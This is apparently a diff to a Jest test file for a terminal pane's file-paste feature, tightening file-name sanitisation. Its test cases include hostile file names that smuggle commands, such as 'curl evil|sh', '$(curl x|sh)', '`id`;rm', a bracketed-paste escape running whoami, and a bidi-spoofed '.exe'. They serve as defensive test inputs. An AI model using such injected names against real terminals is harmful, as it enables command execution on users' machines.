@@ -399,13 +399,13 @@ describe("TerminalPane file paste orchestration", () => {
 
     await waitFor(() =>
       expect(mocks.paste).toHaveBeenCalledWith(
-        expect.stringMatching(new RegExp(String.raw`^\[my report \(v1\)\.pdf\]\(<${DIR}/my report \(v1\)\.pdf>\)$`)),
+        expect.stringMatching(new RegExp(String.raw`^\[my report _v1_\.pdf\]\(<${DIR}/my report _v1_\.pdf>\)$`)),
       ),
     );
     expect(mocks.fsMkdirPrivate).toHaveBeenCalledWith("s1", expect.stringMatching(dirPattern));
     expect(mocks.fsWrite).toHaveBeenCalledWith(
       "s1",
-      expect.stringMatching(inDir(String.raw`my report \(v1\)\.pdf`)),
+      expect.stringMatching(inDir(String.raw`my report _v1_\.pdf`)),
       "aGVsbG8=",
       false,
       expect.any(String),
@@ -506,7 +506,9 @@ describe("TerminalPane file paste orchestration", () => {
     ["carriage return", "x\rcurl evil|sh\r.txt"],
     ["bracketed-paste terminator", "x\u001b[201~whoami\n.txt"],
     ["bidi override", "invoice\u202Etxt.exe"],
-  ])("inserts no control or format characters for a %s file name", async (_label, name) => {
+    ["command substitution", "$(curl x|sh).txt"],
+    ["backtick and semicolon", "`id`;rm.txt"],
+  ])("inserts no control, format or shell metacharacters for a %s file name", async (_label, name) => {
     mountPane();
     await flush();
 
@@ -514,10 +516,12 @@ describe("TerminalPane file paste orchestration", () => {
 
     await waitFor(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
     const text = mocks.paste.mock.calls[0]?.[0] as string;
-    expect(text).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029]/u);
+    expect(text).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029$`;|&*?'"!]/u);
     const path = mocks.fsWrite.mock.calls[0]?.[1] as string;
     expect(path).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029]/u);
-    expect(text).toContain(path.slice(path.lastIndexOf("/") + 1).replace(/[[\]]/g, "\\$&"));
+    const stored = path.slice(path.lastIndexOf("/") + 1);
+    expect(stored).toMatch(/^[\p{L}\p{N} ._+-]+$/u);
+    expect(text.startsWith(`[${stored}](`)).toBe(true);
   });
 
   it("refuses to reuse the paste directory when private creation fails and writes nothing", async () => {
